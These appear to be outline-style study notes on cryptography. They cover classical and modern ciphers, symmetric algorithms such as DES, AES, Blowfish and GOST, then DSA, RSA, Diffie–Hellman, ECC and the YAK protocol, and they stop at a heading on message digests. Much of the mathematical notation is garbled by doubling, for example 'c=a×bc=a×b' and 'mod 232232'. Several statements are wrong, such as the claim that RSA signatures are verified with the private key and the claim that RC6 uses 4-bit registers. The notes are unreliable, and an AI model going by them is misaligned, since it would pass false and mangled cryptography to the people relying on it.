		- Cryptography is the practice of securing information by converting plaintext (readable format) into ciphertext (unreadable format) using a key or encryption scheme. It involves encoding data into a scrambled format that is encrypted and transmitted across private or public networks. Cryptography safeguards confidential data such as email messages, chat sessions, web transactions, personal and corporate data, e-commerce applications, and other types of communication. Despite advances in modern encryption techniques, which are virtually unbreakable, encrypted messages can sometimes be deciphered through cryptanalysis (code-breaking).
		- Objectives of Cryptography:
			- Confidentiality: Ensures that information is accessible only to authorized individuals.
			- Integrity: Prevents unauthorized or improper modifications to data or resources.
			- Authentication: Verifies that a communication, document, or data is genuine.
			- Non-repudiation: Ensures that the sender of a message cannot deny having sent it, and the recipient cannot deny having received it.
		- Cryptography Process:
			- Plaintext (readable format) is encrypted using encryption algorithms such as RSA, DES, and AES, resulting in ciphertext (unreadable format). Upon reaching its destination, the ciphertext is decrypted back into readable plaintext.
		- Types of Cryptography:
			- Cryptography is categorized into two types based on the number of keys used for encryption and decryption:
			- Symmetric Encryption:
				- Symmetric encryption requires both the sender and the receiver to possess the same encryption key. The sender encrypts the plaintext using a key and transmits the ciphertext to the recipient, who then decrypts it using the same key. Because symmetric encryption uses a single key for both encryption and decryption, it is also known as secret-key cryptography.
				- Symmetric encryption is efficient for communication between a small group of users. However, it is impractical for widespread use over the internet, as users who have never communicated before would need to securely share a key beforehand. This limitation is addressed by asymmetric encryption (public-key cryptography).
			- Asymmetric Encryption:
				- Asymmetric encryption, also known as public-key cryptography, was introduced to solve key management challenges. This method involves a pair of keys: a public key, which is available to anyone, and a private key, which is kept secret by the owner.
				- An asymmetric-key system enhances data security by ensuring confidentiality, integrity, authentication, and non-repudiation. It operates using the following sequence:
					- The sender retrieves the recipient's public key from a directory.
					- The sender encrypts the message using this public key and transmits it to the recipient.
					- The recipient decrypts the message using their private key.
				- Only the holder of the corresponding private key can decrypt a message encrypted with the associated public key. This approach enhances security because private keys are never shared or transmitted. To prevent unauthorized individuals from intercepting messages by falsely claiming a recipient's identity, public keys must be securely linked to their respective users. To address this authentication need, digital signatures can be used.
		- Strengths and Weaknesses of Cryptographic Methods:
			- Symmetric Encryption:
				- Strengths:
					- Faster and easier to implement since the same key is used for both encryption and decryption.
					- Requires less processing power and can be implemented in application-specific integrated circuits (ASICs).
					- Prevents widespread message security compromise, as different secret keys can be used for communication with different parties.
					- The encryption key is not transmitted with the data, making decryption impossible even if the data is intercepted.
				- Weaknesses:
					- Lacks a secure channel for exchanging the secret key.
					- Difficult to manage and secure multiple shared keys when communicating with different parties.
					- Does not provide authentication, as the same key is used by both the sender and the receiver.
					- Vulnerable to dictionary attacks and brute-force attacks.
			- Asymmetric Encryption:
				- Strengths:
					- More convenient, as it eliminates the need to securely distribute encryption keys.
					- Enhanced security since private keys are never shared or transmitted.
					- Supports digital signatures, ensuring message authenticity and nonrepudiation.
				- Weaknesses:
					- Slower processing and higher computational requirements compared to symmetric encryption.
					- If the private key is compromised, an attacker can decrypt all intercepted messages.
					- Messages cannot be decrypted if the private key is lost.
					- Vulnerable to man-in-the-middle attacks and brute-force attacks.
	- Government Access to Keys (GAK):
		- Government Access to Keys (GAK) refers to the statutory obligation of individuals and organizations to disclose their cryptographic keys to government agencies. This means that software companies must provide copies of all keys—or at least a portion sufficient for the government to reconstruct or crack the remainder. Law enforcement agencies worldwide use these cryptographic keys to monitor suspicious communications and collect evidence of cybercrimes in the interest of national security.
		- The government assures that it will store these keys securely and only use them when authorized by a court-issued warrant. To authorities, GAK is comparable to traditional wiretapping. Government agencies often rely on key escrow to ensure uninterrupted access to keys. Key escrow is a system in which essential cryptographic keys are stored with a trusted third party, which can use or release them under predefined circumstances. In the context of GAK, this third party is typically a government agency that may use encryption keys to decrypt digital evidence under legal authorization.
		- However, concerns about privacy and security continue to grow. Government agencies are responsible for safeguarding these keys, but they often rely on a single key to protect multiple others—an insecure practice, as the exposure of one key could compromise all linked keys. Additionally, these agencies may not fully understand the sensitivity of the protected information, making it difficult to determine the level of security required. If seized keys also protect unrelated data that the government has no legal right to access, the consequences of key disclosure become unpredictable.
		- As a result, key owners bear significant risks when handing over their encryption keys. Before complying, they must be assured that government agencies will uphold stringent security standards to protect their interests.
	- Ciphers:
		- In cryptography, a cipher is an algorithm (a series of well-defined steps) used for encryption and decryption. Encipherment is the process of converting plaintext into ciphertext, while the reverse process is called decipherment. A message encrypted using a cipher is rendered unreadable unless the recipient possesses the secret key required for decryption.
		- Modern communication technologies (e.g., the Internet, mobile phones) rely on ciphers to ensure both security and privacy. Cipher algorithms may be:
			- Open-source: The algorithm itself is publicly available, but the encryption key remains private.
			- Closed-source: The algorithm is proprietary and restricted to specific domains, such as military applications.
		- Additionally, ciphers may be either free for public use or licensed.
		- Types of Ciphers:
			- Ciphers are classified into two main types: classical and modern.
			- Classical Ciphers:
				- Classical ciphers are basic encryption methods that operate on individual letters (A–Z). These ciphers are generally implemented manually or with simple mechanical devices. Due to their simplicity, they are relatively easy to decipher and thus considered insecure.
				- Types of Classical Ciphers:
					- Substitution Cipher:
						- Replaces units of plaintext with ciphertext according to a specific rule. The units can be single letters, pairs of letters, or groups of letters. The recipient reverses this substitution to decrypt the message.
						- Examples: Beale cipher, autokey cipher, Gronsfeld cipher, Hill cipher.
						- Example encryption:
							- Plaintext: HELLO WORLD
							- Ciphertext: PSTER HGFST (where H = P, E = S, etc.)
					- Transposition Cipher:
						- Rearranges the letters of plaintext according to a systematic pattern to create the ciphertext.
						- Examples: Rail fence cipher, route cipher, Myszkowski transposition cipher.
						- Example encryption:
							- Plaintext: CRYPTOGRAPHY
							- Ciphertext: AOYCRGPTYRHP
			- Modern Ciphers:
				- Modern ciphers are designed to resist cryptographic attacks and ensure confidentiality, integrity, and authentication. They rely on advanced mathematical functions, often involving large prime numbers, to enhance security.
				- Types of Modern Ciphers:
					- Based on the Type of Key Used:
						- Symmetric-Key Algorithms (Private-Key Cryptography): Use the same key for both encryption and decryption.
						- Asymmetric-Key Algorithms (Public-Key Cryptography): Use a pair of keys—one for encryption and another for decryption.
					- Based on the Type of Input Data:
						- Block Cipher:
							- Encrypts fixed-size blocks of data using a deterministic transformation and a symmetric key.
							- Examples: DES, AES, IDEA.
							- If the plaintext block is smaller than the required size, padding is added.
						- Stream Cipher: Encrypts data one bit or byte at a time using a pseudorandom key stream.
						- Examples: RC4, SEAL.
	- Symmetric Encryption Algorithms:
		- Below is a list of various symmetric encryption algorithms, including their cipher type, key size, block size, and common application areas.
			- Data Encryption Standard (DES):
				- Cipher Type: Block
				- Key Size: 56 bits
				- Block Size: 64 bits
				- Application Areas: Legacy systems, early encryption standards
			- Triple DES (3DES):
				- Cipher Type: Block
				- Key Size: 112, 168 bits
				- Block Size: 64 bits
				- Application Areas: Financial services, payment systems
			- Advanced Encryption Standard (AES):
				- Cipher Type: Block
				- Key Size: 128, 192, 256 bits
				- Block Size: 128 bits
				- Application Areas: Secure communications, storage encryption, government standards
			- RC4:
				- Cipher Type: Stream
				- Key Size: 40 to 2048 bits (variable)
				- Block Size: N/A
				- Application Areas: Secure web traffic (HTTPS), Wi-Fi security (WEP/WPA), streaming encryption
			- RC5:
				- Cipher Type: Block
				- Key Size: 0 to 2040 bits (variable)
				- Block Size: 32, 64, 128 bits
				- Application Areas: Cryptographic libraries, secure communication
			- RC6:
				- Cipher Type: Block
				- Key Size: 128, 192, 256 bits
				- Block Size: 128 bits
				- Application Areas: Advanced encryption, AES competition finalist
			- Blowfish:
				- Cipher Type: Block
				- Key Size: 32 to 448 bits (variable)
				- Block Size: 64 bits
				- Application Areas: Replacement for DES, secure storage
			- Twofish:
				- Cipher Type: Block
				- Key Size: 128, 192, 256 bits
				- Block Size: 128 bits
				- Application Areas: File and disk encryption, open-source software
			- International Data Encryption Algorithm (IDEA):
				- Cipher Type: Block
				- Key Size: 128 bits
				- Block Size: 64 bits
				- Application Areas: Secure email (PGP), data encryption
			- Threefish:
				- Cipher Type: Block
				- Key Size: 256, 512, 1024 bits
				- Block Size: 256, 512, 1024 bits
				- Application Areas: Disk encryption (Skein hash function)
			- Serpent:
				- Cipher Type: Block
				- Key Size: 128, 192, 256 bits
				- Block Size: 128 bits
				- Application Areas: High-security applications, AES competition finalist
			- Camellia:
				- Cipher Type: Block
				- Key Size: 128, 192, 256 bits
				- Block Size: 128 bits
				- Application Areas: Secure communications, Japanese encryption standard
			- Tiny Encryption Algorithm (TEA):
				- Cipher Type: Block
				- Key Size: 128 bits
				- Block Size: 64 bits
				- Application Areas: Lightweight encryption, embedded systems
			- CAST-128:
				- Cipher Type: Block
				- Key Size: 40 to 128 bits
				- Block Size: 64 bits
				- Application Areas: Various software applications, secure communications
			- CAST-256:
				- Cipher Type: Block
				- Key Size: 128, 160, 192, 224, 256 bits
				- Block Size: 128 bits
				- Application Areas: Advanced encryption, cryptographic libraries
			- ChaCha20:
				- Cipher Type: Stream
				- Key Size: 256 bits
				- Block Size: N/A
				- Application Areas: Secure communications, modern encryption protocols
			- Salsa20:
				- Cipher Type: Stream
				- Key Size: 256 bits
				- Block Size: N/A
				- Application Areas: Secure communications, cryptographic protocols
		- Data Encryption Standard (DES):
			- DES is a standard for data encryption that uses a secret key for both encryption and decryption (symmetric cryptosystem). It employs a 64-bit secret key, of which 56 bits are randomly generated, while the remaining 8 bits are used for error detection. DES utilizes the Data Encryption Algorithm (DEA), a secret key block cipher that operates with a 56-bit key on 64-bit data blocks.
			- As the archetypal block cipher, DES takes a fixed-length plaintext string and transforms it into a ciphertext string of the same length. Its design allows implementation in hardware and facilitates single-user encryption, such as securely storing files on a hard disk. DES provides 72 quadrillion or more possible encryption keys, selecting a random key for each message.
			- However, due to its vulnerabilities against modern computing power, many organizations have adopted Triple DES (3DES) as an alternative. 3DES strengthens security by repeating the encryption process three times until systems are upgraded to support Advanced Encryption Standard (AES).
		- Triple Data Encryption Standard (3DES):
			- Over time, it became evident that DES was no longer secure. The U.S. Federal Government initiated a contest to find a replacement cryptographic algorithm. Meanwhile, 3DES was introduced as an interim solution, essentially applying DES encryption three times with different keys.
			- 3DES employs a key bundle comprising three DES keys: K1, K2, and K3, each being a standard 56-bit DES key. The encryption process follows this sequence:
				- Encrypt with K1
				- Decrypt with K2
				- Encrypt with K3
			- There are three possible key configurations:
				- Option 1: All three keys (K1, K2, and K3) are unique (most secure).
				- Option 2: K1 and K3 are identical, while K2 is different (moderately secure).
				- Option 3: All three keys are the same, effectively applying DES three times with the same key (least secure).
			- Despite its increased security over DES, 3DES is now considered outdated due to its vulnerability to brute-force attacks, leading to the adoption of AES.
		- Advanced Encryption Standard (AES):
			- The Advanced Encryption Standard (AES) is a specification established by the National Institute of Standards and Technology (NIST) for encrypting electronic data. It is widely used to secure telecommunications, financial transactions, and government data. U.S. government agencies rely on AES to protect sensitive but unclassified information.
			- AES is a symmetric-key algorithm, meaning the same key is used for both encryption and decryption. It operates as an iterated block cipher, applying multiple rounds of transformations to the data. AES has a 128-bit block size and supports key sizes of:
				- 128 bits (AES-128)
				- 192 bits (AES-192)
				- 256 bits (AES-256)
			- AES is designed for efficient implementation in both software and hardware, allowing for simultaneous encryption across multiple network layers.
		- RC4, RC5, and RC6 Algorithms:
			- The following are symmetric encryption algorithms developed by RSA Security:
			- RC4:
				- RC4 is a variable key-size symmetric-key stream cipher with byte-oriented operations, based on the use of a random permutation. According to some analyses, the period of the cipher is likely greater than 10¹⁰⁰. Each output byte requires 8 to 16 system operations, allowing the cipher to run efficiently in software. RC4 is commonly used for securing communications, such as traffic encryption (which secures websites) and in websites utilizing the SSL protocol.
			- RC5:
				- RC5 is a fast symmetric-key block cipher designed by Ronald Rivest for RSA Data Security (now RSA Security). It is a parameterized algorithm with a variable block size, variable key size, and variable number of rounds. The block sizes can be 32, 64, or 128 bits. The number of rounds can range from 0 to 255, and the key size can vary from 0 to 2,040 bits. This built-in flexibility allows RC5 to adapt to different levels of security.
				- RC5 operates through three main routines: key expansion, encryption, and decryption. In the key expansion routine, the secret key provided by the user is expanded to fill a key table, the size of which depends on the number of rounds. Both encryption and decryption use this key table. The encryption process involves three fundamental operations: integer addition, bitwise XOR, and variable rotation. The extensive use of data-dependent rotation and the combination of different operations contribute to the security of RC5.
			- RC6:
				- RC6 is a symmetric-key block cipher derived from RC5. Like RC5, it is a parameterized algorithm with a variable block size, key size, and number of rounds.
				- Two key differences between RC6 and RC5 are:
					- Integer multiplication, which increases diffusion, allowing the cipher to achieve higher security with fewer rounds while maintaining speed.
					- The use of four 4-bit working registers instead of two 2-bit registers. This design choice aligns with the 128-bit block size requirement of the AES (Advanced Encryption Standard).
		- Blowfish:
			- Blowfish is a symmetric block cipher algorithm designed to replace DES or IDEA. It uses the same secret key for both encryption and decryption. This algorithm splits data into 64-bit blocks and supports key sizes ranging from 32 to 448 bits. Due to its high speed and overall efficiency, Blowfish is used in various applications, including password protection tools and e-commerce websites for securing payments. It is a 16-round Feistel cipher that operates on 64-bit blocks. Unlike DES, Blowfish allows a flexible key size between 32 and 448 bits.
			- The algorithm consists of two main components:
				- Key Expansion: Expands the key into subkeys.
				- Data Encryption: Encrypts data using the expanded keys.
			- Key expansion follows these steps:
				- Initialize the P-array and S-boxes.
				- XOR the P-array with key bits. For example, P1 XOR (first 32 bits of the key), P2 XOR (next 32 bits of the key).
				- Encrypt an all-zero string using Blowfish.
				- Replace P1 and P2 with the output.
				- Encrypt the new P1 and P2 with modified subkeys.
				- Replace P3 and P4 with the new output.
				- Repeat the process 521 times to derive subkeys for the P-array and S-boxes.
			- In each encryption round, the round function splits the 32-bit input into four 8-bit quarters, processes them through S-boxes, and combines them using modular addition (mod 232232) and XOR operations to produce the final 32-bit output.
		- Twofish:
			- Twofish was one of the five finalists in the U.S. Government’s competition to replace DES, though it was not ultimately selected. It was designed by Bruce Schneier, John Kelsey, Doug Whiting, David Wagner, Chris Hall, and Niels Ferguson.
			- Twofish is a 128-bit block cipher that supports key sizes up to 256 bits. It is a Feistel cipher known for its speed and flexibility, making it suitable for software and hardware implementations, as well as network-based applications. It allows performance trade-offs between encryption speed, hardware complexity, and memory usage, enabling users to optimize performance based on key scheduling.
		- Threefish:
			- Developed in 2008, Threefish is part of the Skein cryptographic hash function family and was a contender in NIST’s SHA-3 competition. It is a tweakable symmetric-key block cipher with block and key sizes of 256, 512, or 1024 bits.
			- Threefish uses only three basic operations: addition, rotation, and XOR (ARX), which simplifies implementation. All operations work on 64-bit words. The number of encryption rounds depends on the block size:
				- 256-bit block -> 72 rounds
				- 512-bit block -> 72 rounds
				- 1024-bit block -> 80 rounds
			- Unlike traditional ciphers, Threefish does not use S-boxes, making it resistant to cache timing attacks.
		- Serpent:
			- Serpent is a symmetric-key block cipher and was a finalist in the AES competition. It was designed by Ross Anderson, Eli Biham, and Lars Knudsen. Serpent operates on a 128-bit block and supports key sizes of 128, 192, or 256 bits. It can be implemented in both hardware and software without restrictions.
			- The algorithm consists of 32 rounds of computations, using substitution and permutation operations. It processes data in four 32-bit words and applies 8 S-boxes, each with 4-bit input and output. All S-boxes operate in parallel across 32 rounds.
			- Although Serpent is considered highly secure, Rijndael (now AES) was chosen over it due to its higher encryption speed and lower computational complexity. However, Serpent offers stronger resistance against cryptanalysis by minimizing the correlation between encoded plaintext and ciphertext more effectively than Twofish or Rijndael.
		- TEA (Tiny Encryption Algorithm):
			- The Tiny Encryption Algorithm (TEA) was created by David Wheeler and Roger Needham and was first introduced in 1994. It is a simple yet effective Feistel cipher that is easy to implement in software.
			- TEA operates on a 64-bit block using a 128-bit key. The algorithm consists of 64 rounds, though this number can be adjusted as long as it remains even (since rounds are grouped into pairs called cycles).
			- TEA uses a delta constant, defined as 232/ϕ232/ϕ (where ϕϕ is the golden ratio). In each round, a multiple of delta is used. The 128-bit key is split into four 32-bit subkeys (K[0] to K[3]).
			- Unlike other Feistel ciphers that rely heavily on XOR operations, TEA uses addition and subtraction modulo 232232. The block is split into two halves, L and R, where R is processed through the round function:
				- Left shift R by 4 and add K[0].
				- Add delta (current multiple of 232/ϕ232/ϕ).
				- Right shift the result by 5 and add K[1].
				- XOR the result with L.
				- Swap L and R for the next round.
			- This process repeats for the chosen number of rounds, ensuring strong encryption.
		- CAST-128:
			- CAST-128, also called CAST5, is a symmetric-key block cipher that employs a classical 12- or 16-round Feistel network with a block size of 64 bits. CAST-128 supports a key size ranging from 40 bits to 128 bits in 8-bit increments. Its components include large 8×32-bit S-boxes (S1, S2, S3, S4) based on bent functions, modular addition and subtraction, key-dependent rotation, and XOR operations. CAST-128 utilizes a masking key (Km1) and a rotation key (Kr1) to perform its functions. The round function consists of three alternating types, executing addition, subtraction, or XOR operations at different stages. It is used as the default cipher in GPG (GNU Privacy Guard) and PGP (Pretty Good Privacy).
			- CAST-256 is an extension of CAST-128 that follows the same design principles. CAST-256 has a 128-bit block size and supports key sizes ranging from 128 to 256 bits. Additionally, it is vulnerable to zero-correlation cryptanalysis, which can break 28 rounds with a time complexity of 2²⁴⁶.⁹ and a data complexity of 2⁹⁸.⁸.
		- GOST Block Cipher:
			- The GOST (Government Standard) block cipher, also known as Magma, is a symmetric-key block cipher that employs a 32-round Feistel network operating on 64-bit blocks with a 256-bit key length. It features an S-box that can remain secret and contains approximately 354 bits of secret information. GOST is a simple encryption algorithm in which the round function involves adding a 32-bit subkey modulo 2³², passing it through an S-box layer, and performing a left circular shift by 11 bits, thereby generating the round function's output.
			- The key scheduling in the GOST block cipher is achieved by dividing the 256-bit key into eight 32-bit subkeys, each of which is used four times. In this algorithm, the key words are applied in sequential order for the first 24 rounds and in reverse order for the final 8 rounds.
			- Kuznyechik is the latest extension of GOST, utilizing 128-bit blocks for encryption.
		- Camellia:
			- Camellia is a symmetric-key block cipher that operates with either 18 rounds (for 128-bit keys) or 24 rounds (for 256-bit keys). It is a Feistel cipher with a block size of 128 bits and supports key sizes of 128, 192, and 256 bits. Camellia employs four 8×8-bit S-boxes that perform affine transformations and logical operations. A logical transformation layer, called the FL function (or its inverse), is applied every six rounds.
			- Camellia enhances security through a key whitening technique. It is incorporated into the Transport Layer Security (TLS) protocol, which facilitates secure communication. Despite its 128-bit key size, Camellia remains resistant to brute-force attacks even with the latest technology, making it a highly secure cipher. Furthermore, Camellia provides strong security levels while maintaining processing efficiency comparable to AES (Rijndael).
	- Asymmetric Encryption Algorithms:
		- Below are various asymmetric encryption algorithms along with their key sizes and application areas:
			- Rivest–Shamir–Adleman (RSA):
				- Key Size: Variable
				- Application Areas: Encryption, digital signatures, key exchange
			- Digital Signature Algorithm (DSA):
				- Key Size: Variable
				- Application Areas: Digital signatures
			- Diffie-Hellman:
				- Key Size: Variable
				- Application Areas: Key exchange, secure communication
			- Elliptic Curve Cryptography (ECC):
				- Key Size: 160-521 bits
				- Application Areas: Encryption, digital signatures, key exchange
			- ElGamal:
				- Key Size: Variable
				- Application Areas: Encryption, key exchange
		- DSA and Related Signature Schemes:
			- The Digital Signature Algorithm (DSA) is a Federal Information Processing Standard (FIPS) for digital signatures. The National Institute of Standards and Technology (NIST) proposed DSA for use in the Digital Signature Standard (DSS), which was adopted as FIPS 186. DSA is used for generating and verifying digital signatures in sensitive but unclassified applications. It produces a 320-bit digital signature with 512–1024-bit security.
			- A digital signature is a mathematical scheme used to authenticate digital messages. The computation of a digital signature follows a specific set of rules (i.e., DSA) and parameters, enabling users to verify both the identity of the signatory and the integrity of the data.
			- Processes Involved in DSA:
				- Signature Generation Process: The private key is used to create the signature, proving the signer's identity.
				- Signature Verification Process: The public key is used to verify whether the digital signature is authentic.
			- DSA is a public-key cryptosystem because it involves the use of both private and public keys.
			- Benefits of DSA:
				- Lower risk of forgery compared to a handwritten signature
				- Quick and easy method for secure business transactions
				- Helps mitigate issues related to counterfeit currency
			- DSA Algorithm:
				- Each entity A follows these steps:
					- Select a prime number q such that 2¹⁵⁹ < q < 2¹⁶⁰.
					- Choose t such that 0 ≤ t ≤ 8, then select a prime number p where 2⁵¹¹⁺⁶⁴ᵗ < p < 2⁵¹²⁺⁶⁴ᵗ, ensuring that q divides (p - 1).
					- Select a generator α of the unique cyclic group of order q in Zₚ*, by choosing an element g ∈ Zₚ* and computing α = g^(p−1)/q mod p until α ≠ 1.
					- Select a random integer d such that 1 ≤ d ≤ q - 1.
					- Compute y = α^d mod p.
					- A’s public key is (p, q, α, y), and A’s private key is d.
				- To Sign a Message mm, A Does the Following:
					- Select a random secret integer k, where 0 < k < q.
					- Compute r = (α^k mod p) mod q.
					- Compute s = k⁻¹ * (h(m) + d * r) mod q, where h is the Secure Hash Algorithm (SHA).
					- A’s digital signature for message mm is the pair (r,s)(r,s).
				- To Verify A’s Signature (r,s)(r,s) on mm, B Should Do the Following:
					- Obtain A’s authentic public key (p,q,α,y)(p,q,α,y).
					- Check if 0 < r < q and 0 < s < q. If not, reject the signature.
					- Compute w = s⁻¹ mod q and h(m).
					- Compute u₁ = (w * h(m)) mod q and u₂ = (r * w) mod q.
					- Compute v = (α^u₁ * y^u₂ mod p) mod q.
					- Accept the signature if and only if v = r.
		- Rivest-Shamir-Adleman (RSA):
			- Ron Rivest, Adi Shamir, and Leonard Adleman formulated RSA, a public-key cryptosystem used for Internet encryption and authentication. RSA relies on modular arithmetic and number theory to perform computations using two large prime numbers. It is widely implemented across various products, platforms, and industries and is considered a de facto encryption standard. Companies such as Microsoft, Apple, Sun, and Novell integrate RSA algorithms into their operating systems. RSA is also used in hardware-secured telephones, Ethernet network cards, and smart cards.
			- How RSA Works:
				- Two large prime numbers, aa and bb, are chosen, and their product is computed: c=a×bc=a×b (where cc is called the modulus).
				- A number ee is selected such that it is less than cc and relatively prime to (a−1)(b−1)(a−1)(b−1), meaning ee and (a−1)(b−1)(a−1)(b−1) share no common factors except 1.
				- A number ff is chosen such that (e×f−1)(e×f−1) is divisible by (a−1)(b−1)(a−1)(b−1).
				- The values ee and ff serve as the public and private exponents, respectively.
				- The public key consists of the pair (c,e)(c,e), while the private key consists of (c,f)(c,f).
				- Obtaining the private key (c,f)(c,f) from the public key (c,e)(c,e) is computationally difficult. However, if an attacker can factor cc into aa and bb, they can determine the private key.
				- The security of the RSA system relies on the assumption that factoring large numbers is computationally difficult, making the encryption method secure.
			- RSA in Practical Use:
				- A typical application of RSA encryption is as follows:
					- The sender encrypts a message using a randomly generated DES (Data Encryption Standard) symmetric key. DES is a relatively insecure symmetric-key system that uses 64-bit encryption (56 bits for key size, 8 bits for error detection).
					- The sender retrieves the recipient’s public key and uses RSA to encrypt the DES key.
					- The sender transmits an RSA digital envelope, which includes both the DES-encrypted message and the RSA-encrypted DES key.
					- The recipient decrypts the DES key using their RSA private key, then uses the DES key to decrypt the message.
				- This approach leverages the high speed of DES for encryption while benefiting from RSA’s secure key management.
			- RSA Signature Scheme:
				- RSA is used not only for public-key encryption but also for digital signatures, which allow messages to be signed and verified. The RSA signature scheme was the first technique for generating digital signatures and remains widely used.
				- RSA involves both a public and private key:
					- The public key is used by anyone to encrypt messages.
					- The private key is required to decrypt messages or verify signatures.
				- Example:
					- John encrypts his document MM using his private key SASA​, creating a signature SJohn(M)SJohn​(M).
					- John sends both MM and SJohn(M)SJohn​(M) to Alice.
					- Alice verifies John’s signature by decrypting the signature using John’s public key.
			- RSA Key Generation:
				- RSA key generation follows a common process across all RSA-based signature schemes. To generate an RSA key pair:
					- Select two large distinct prime numbers, pp and qq, of approximately the same bit length.
					- Compute n=p×qn=p×q and ϕ=(p−1)(q−1)ϕ=(p−1)(q−1).
					- Choose a random integer ee such that 1<e<ϕ1<e<ϕ and gcd(e, ϕϕ) = 1 (where gcd is the greatest common divisor).
					- Use the extended Euclidean algorithm to compute dd, the unique integer satisfying:
						- e×d≡1 (mod ϕ)
					- The public key is (n,e)(n,e), and the private key is dd.
					- Securely destroy pp and qq after key generation.
			- RSA Signature Generation and Verification:
				- Signature Generation:
					- To sign a message mm, entity AA performs the following steps:
						- Compute m~=R(m)m~=R(m), where m~m~ is an integer in the range [0, n−1n−1].
						- Compute s=m~dmod  ns=m~dmodn.
						- The signature is ss.
				- Signature Verification:
					- To verify AA’s signature ss and recover mm, entity BB performs:
						- Retrieve AA’s authentic public key (n,e)(n,e).
						- Compute m~=semod  nm~=semodn.
						- Verify that m~m~ is within the expected message space; if not, reject the signature.
						- Recover m=R−1(m~)m=R−1(m~).
			- Example of RSA Algorithm:
				- The mathematics behind RSA encryption is as follows:
				- Select two large prime numbers:
					- P=61P=61, Q=53Q=53
					- (Destroy these after computing EE and DD).
				- Compute the modulus:
					- PQ=61×53=3233PQ=61×53=3233 (shared publicly).
				- Choose a public exponent:
					- E=17E=17 (shared publicly).
				- Compute the private exponent DD, which satisfies:
					- D×E≡1mod  (P−1)(Q−1)D×E≡1mod(P−1)(Q−1).
					- Here, D=2753D=2753 (keep this secret).
				- Public key: (E,PQ)=(17,3233)
				- Private key: D=2753
				- Encryption Example:
					- To encrypt plaintext T=123:
						C=(TE)modPQ=(12317)mod3233
						C=855
				- Decryption Example:
					- To decrypt ciphertext C=855C=855:
						T=(CD)modPQ=(8552753)mod3233
						T=123
				- The modular exponentiation steps confirm that the original plaintext 123123 is recovered.
			- Conclusion: RSA is a foundational encryption and signature algorithm widely used in securing digital communications. Its security relies on the computational difficulty of factoring large prime numbers, ensuring robust protection for encrypted messages and digital signatures.
		- Diffie–Hellman:
			- Diffie–Hellman is a cryptographic protocol that allows two parties to establish a shared key over an insecure channel. It was developed and published by Whitfield Diffie and Martin Hellman in 1976. However, it was independently developed a few years earlier by Malcolm J. Williamson of the British Intelligence Service, but it was classified at that time.
			- Diffie–Hellman Algorithm:
				- The system has two parameters, p and g:
					- p is a prime number.
					- g (usually called a generator) is an integer less than p, with the following property: for every number n between 1 and p - 1 (both inclusive), there exists some power k such that: n=gk modp
				- Many cryptography textbooks use the fictitious characters “Alice” and “Bob” to illustrate cryptographic concepts. We will do the same here:
					- Key Generation:
						- Alice generates a random private value a, and Bob generates a random private value b. Both a and b are chosen from the set of integers.
						- Using parameters p and g, they derive their public values:
							- Alice’s public value: g^a mod p
							- Bob’s public value: g^b mod p
					- Key Exchange:
						- Alice and Bob exchange their public values.
					- Key Derivation:
						- Alice computes: k = (gb modp)a modp
						- Bob computes: k = (ga modp)b modp
						- Since both computations result in the same value (k), Alice and Bob now share a common secret key.
			- Security Considerations:
				- The Diffie–Hellman algorithm does not provide authentication for the key exchange, making it vulnerable to man-in-the-middle attacks. However, it serves as the foundation for many authentication mechanisms. For example, it ensures forward secrecy in the ephemeral modes of the TLS protocol, depending on the cipher suite used.
		- Elliptic Curve Cryptography (ECC):
			- Elliptic Curve Cryptography (ECC) is a modern public-key cryptographic system designed to reduce the need for large cryptographic key sizes. This asymmetric cryptosystem relies on number theory and mathematical elliptic curves (algebraic structures) to generate short, efficient, and secure cryptographic keys.
			- RSA, a widely used public-key algorithm, requires significantly larger key sizes to maintain security. Since encryption speed is influenced by key size—where smaller keys enable faster encryption—ECC has been proposed as an alternative to RSA to minimize key size while maintaining strong security.
			- The operational key sizes for both algorithms to achieve equivalent security levels are as follows:
				- For ECC key sizes of 160–223 bits, RSA requires a 1024-bit key.
				- For ECC key sizes of 224–255 bits, RSA requires a 2048-bit key.
				- For ECC key sizes of 256–383 bits, RSA requires a 3072-bit key.
				- For ECC key sizes of 384–511 bits, RSA requires a 7680-bit key.
				- For ECC key sizes of 512+ bits, RSA requires a 15,360-bit key.
			- For example, while RSA requires a 1024-bit key to encrypt data, ECC provides equivalent security with a key size of just 160 to 223 bits. For high-security applications, RSA requires a 7680-bit key, whereas ECC achieves the same security level with a key size between 384 and 511 bits.
		- YAK:
			- YAK is a public-key-based Authenticated Key Exchange (AKE) protocol. Its authentication mechanism relies on public key pairs, requiring a Public Key Infrastructure (PKI) to distribute authentic public keys. YAK is a variant of the two-pass Hashed Menezes‐Qu‐Vanstone (HMQV) protocol that incorporates zero‐knowledge proofs (ZKP) to verify knowledge of ephemeral secret keys from both parties. However, the YAK protocol lacks joint key control and perfect forward secrecy.
			- The YAK protocol implementation between two parties, Alice and Bob, is described as follows:
				- Alice selects a random number xx such that x∈R[0,q−1]x∈R​[0,q−1], computes X=gxX=gx, and generates a zero-knowledge proof of xx, denoted as KP{x}KP{x}. Alice then sends XX and KP{x}KP{x} to Bob.
				- Bob selects a random number yy such that y∈R[0,q−1]y∈R​[0,q−1], computes Y=gyY=gy, and generates a zero-knowledge proof of yy, denoted as KP{y}KP{y}. Bob then sends YY and KP{y}KP{y} to Alice.
				- Alice verifies KP{y}KP{y} and, upon successful verification, computes the session key as: k=H((Y⋅PKB)x+a) where HH is a cryptographic hash function.
				- Bob verifies KP{x}KP{x} and, upon successful verification, computes the session key as: k=H((X⋅PKA)y+b)
				- Upon mutual authentication, both parties derive the same session key: k=H(g(x+a)(y+b))
			- The YAK protocol achieves the following security properties:
				- Private key security
				- Full forward secrecy
				- Session key security
	- Message Digest (One-Way Hash) Functions:
		- Hash functions compute a unique, fixed-size bit string representation, called a message digest, for any arbitrary block of data. These functions condense the information in a file—regardless of its size—into a single, fixed-length value, typically between 128 and 256 bits. If any bit of the input changes, each output bit has a 50% probability of flipping.
		- Given an input file and its corresponding message digest, it should be nearly impossible to find another file with the same message digest value, as generating two different files with the same hash is computationally infeasible.
		- Message digest functions are also called one-way hash functions because they produce values that are:
			- Nearly impossible to invert
			- Resistant to attacks
			- Mostly unique
			- Widely distributed
		- Message digest algorithms do not perform encryption or decryption. Instead, they facilitate the creation of digital signatures and message authentication codes (MACs) and enable the derivation of encryption keys from passphrases. The primary role of cryptographic hash functions is to ensure data integrity, making them a crucial component of digital signatures. Since they operate faster than digital signature algorithms, they are used to compute signatures for a document's hash value, which is smaller than the original document. Additionally, message digests help obscure the contents or source of a document.
		- Note: Message digests are also called one-way hash functions because they cannot be reversed.
		- Common Message Digest Algorithms:
			- MD5
